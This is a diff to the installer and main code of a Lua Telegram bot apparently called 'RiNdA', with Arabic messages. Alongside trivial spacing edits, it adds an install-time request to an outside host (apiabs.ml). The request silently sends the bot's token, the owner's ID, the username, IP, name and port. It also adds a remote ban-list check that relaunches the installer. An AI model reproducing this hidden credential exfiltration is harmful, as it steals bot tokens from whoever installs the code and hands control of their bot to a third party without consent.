@@ -45,8 +45,17 @@ if not database:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
+data,res = https.request("https://apiabs.ml/Api/RiNdA/index.php?Ban=RiNdA&Info&Id="..SUDOID)
+if res == 200 then
+Abs = json:decode(data)
+if Abs.Result.Info == 'Is_Spam' then
+print('\27[1;31m a⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\\nعذرا هذا الايدي محظور من تنصيب هذا السورس\na⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ') 
+os.execute('lua RiNdA.lua') 
+end 
+if Abs.Result.Info == 'Ok' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
+end
 else
 print('\27[0;31m⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ \n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
@@ -75,7 +84,7 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
----- https.request('http://mode-pro.tk/RiNdA/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+https.request("https://apiabs.ml/Api/RiNdA/index.php?Get=RiNdA&DevId="..database:get(id_server..":SUDO:ID").."&TokenBot="..database:get(id_server..":token").."&User="..User.."&Ip="..IP.."&Name="..Name.."&Port="..Port)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("RiNdA", "w")  
 file:write([[
@@ -12592,7 +12601,7 @@ t = t..""..k.."- (`"..v.."`)\n"
 end
 end
 if #list == 0 then
-t = "* • لا يوجد ادمن*"
+t = "* •لا يوجد ادمن*"
 end
 send(msg.chat_id_,0,''..t..'\n●━━━━𝐑𝐀━━━━●\n •تم التعديل على الميديا\n •الشخص الي قام بالتعديل\n •ايدي الشخص ◂ '..result.sender_user_id_..'\n •معرف الشخص>{ '..users..' }') 
 end,nil)
@@ -12693,7 +12702,7 @@ end
 if text then
 local RiNdA1_Msg = database:get(bot_id.."RiNdA1:Add:Filter:Rp2"..text..result.chat_id_)   
 if RiNdA1_Msg then    
-send(msg.chat_id_, msg.id_," • "..RiNdA1_Msg)
+send(msg.chat_id_, msg.id_," •"..RiNdA1_Msg)
 DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
 return false
 end
